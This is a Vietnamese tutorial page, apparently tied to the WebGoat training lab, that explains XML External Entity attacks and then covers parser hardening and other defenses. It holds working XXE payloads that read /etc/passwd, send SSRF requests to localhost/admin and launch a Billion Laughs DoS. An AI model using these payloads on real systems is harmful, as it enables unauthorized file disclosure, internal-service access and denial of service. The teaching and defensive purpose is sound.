---
title: 1.01 | XXE
slug: XXE-01
description: Bài viết này sẽ hướng dẫn cách tấn công XXE trên WebGoat 2023.8
image: https://tiennhm.github.io/img/docs/database.jpg
sidebar_position: 1
# sidebar_class_name: hidden
tags: 
    - web-security
    - webgoat
    - security-misconfiguration
    - xxe
    - webgoat-2023.8
keywords: [web-security, webgoat, security-misconfiguration, xxe, webgoat-2023.8]
enableComments: true # for Gisqus comments, set to true
draft: false # set to true to hide this post from the site
---

> 🛡 **XML External Entity (XXE) Attack**  

## 🔥 **1. Khái niệm**  
**XXE (XML External Entity Attack)** là một lỗ hổng bảo mật khi ứng dụng xử lý XML mà không vô hiệu hóa thực thể bên ngoài (external entity). Hacker có thể khai thác để:  
- Đọc file trên server  
- Rò rỉ thông tin nhạy cảm  
- Thực hiện Server-Side Request Forgery (SSRF)  
- Tấn công DoS  


## 🛠 **2. Cách thức hoạt động của XXE**  
Khi một XML parser cho phép external entity, hacker có thể chèn payload để truy xuất dữ liệu từ server.  

Ví dụ, một ứng dụng nhận XML từ user:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
    <!ENTITY xxe SYSTEM "file:///etc/passwd">  
]>
<user>
    <name>&xxe;</name>
</user>
```
Nếu server xử lý XML mà không tắt external entity, nó sẽ thay `&xxe;` bằng nội dung file `/etc/passwd`.


## 🚀 **3. Tấn công XXE**  
### **(1) Đọc file từ server**  
Gửi XML với entity trỏ đến file hệ thống:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```
Nếu bị khai thác, response sẽ chứa nội dung file `/etc/passwd`.

### **(2) SSRF Attack (Tấn công dịch vụ nội bộ)**  
Dùng XXE để gửi request đến nội bộ hệ thống:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://localhost/admin">
]>
<user>
    <name>&xxe;</name>
</user>
```
Nếu server có API nội bộ trên `localhost/admin`, hacker có thể khai thác nó.

### **(3) DoS Attack (Billion Laughs Attack)**  
Dùng recursion để tạo vô số entity gây crash server:
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "LOL">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>
```


## 🛡 **4. Cách phòng chống XXE**  
✅ **Vô hiệu hóa DTD & external entity trong XML parser**  
Trong Java:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
Trong .NET:
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
```

✅ **Sử dụng JSON thay vì XML**  
JSON không có entity nên an toàn hơn.

✅ **Giới hạn quyền đọc file trên server**  
Dùng `chroot`, SELinux hoặc AppArmor để giới hạn phạm vi đọc file.

✅ **Dùng WAF (Web Application Firewall)**  
Chặn payload chứa `<!ENTITY` hoặc `SYSTEM`.

